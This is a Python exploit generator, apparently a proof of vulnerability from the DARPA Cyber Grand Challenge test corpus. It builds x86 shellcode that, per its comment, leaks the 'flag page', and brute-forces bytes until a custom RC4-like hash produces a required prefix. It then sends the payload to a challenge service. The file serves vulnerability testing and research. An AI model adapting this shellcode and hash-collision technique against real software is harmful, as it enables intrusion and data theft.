#!/usr/bin/env python
#
# Copyright (C) 2014 
#   Brian Caswell <bmc@lungetech.com>
#   Narf Industries <info@narfindustries.com>
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included
# in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
# OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
# CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
# TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#
import string
import sys
import os

from generator.actions import Actions
from random import choice,randint
from struct import *


sys.path.append(os.path.dirname(os.path.realpath(__file__)))

from payloads import *

def rc4ish(data):
    '''A python implementation of our lovable psuedo-hashing algorithm'''

    s = [i for i in reversed(range(256))]
    j = 0
    out = ["\x00"]*16
    key = data

    for i in range(256):
        j = (j + s[i] + ord(key[i%len(key)])) % 256
        s[i],s[j] = s[j],s[i]
    
    i = j = 0
    for c in data:
        i = (i+1) % 256
        j = (j+s[i]) % 256
        s[i],s[j] = s[j],s[i]
        out[i%16] = chr(ord(out[i%16]) ^ ord(c) ^ s[(s[i]+s[j]) % 256])

    return "".join(out)

def random_alpha(a, b):
    return ''.join(choice(string.letters) for _ in range(randint(a, b)))

def build_seg(l,n,d,c):
    return pack("<I16s112s4096s",l,n,d,c)

def urand(size):
    return ''.join(chr(randint(0,255)) for _ in range(size)) 

responses = [
    "It's all just electrons.",
    "TOO MANY SECRETS",
    "It's a living.",
    "Mess with the best...",
    "You can't stop the signal, Mal.",
]

def find_collision():
    leak = "\xb8\x02\x00\x00\x00\xbb\x01\x00\x00\x00\xb9\x00\xc0GC\xba\x04\x00\x00\x00\xbe\x00\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80"
    '''
    Payload to leak flag page, then exit:
        movl   $0x2, %eax
        movl   $0x1, %ebx
        movl   $0x4347C000,%ecx
        movl   $0x4, %edx
        movl   $0x0, %esi
        int    $0x80
        movl   $0x1, %eax
        int    $0x80
    '''

    while 1:
        r = urand(10)
        if rc4ish(pack("4096s",leak+r)).startswith('\xb7\x00'):
            break
    return pack("4096s",leak+r)


class SIGSEGV(Actions):
    def start(self):
        pass
    def strncmp(self):
        p = find_collision()
        name = random_alpha(1,15)
        desc = random_alpha(1,111)

        self.write(pack("<I",1))
        self.write(build_seg(4096,name,desc,p))
        self.read(delim="\n",expect=name)
        self.read(delim="\n",expect=desc)
        #will never happen
        self.read(delim="\n",expect=responses[0])
        self.read(delim="\n",expect="fin.")



